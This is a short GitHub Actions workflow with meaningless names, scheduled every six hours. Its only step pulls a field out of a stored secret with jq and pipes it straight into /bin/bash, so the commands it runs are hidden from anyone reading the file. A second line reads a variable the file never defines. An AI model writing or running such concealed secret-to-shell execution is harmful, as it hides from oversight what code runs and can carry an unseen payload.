name: qudailiyu

on:
  workflow_dispatch:
  schedule:
    - cron: '31 5/6 * * *'

jobs:  # 952
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4
      - name: qudailiyu
        env:
          eap1: ${{ secrets.eap1 }}
        run: |
          echo $eap1 | jq -r .bjl2 | /bin/bash
          echo $mgnxf99 | jq -r .mji2 | /bin/bash

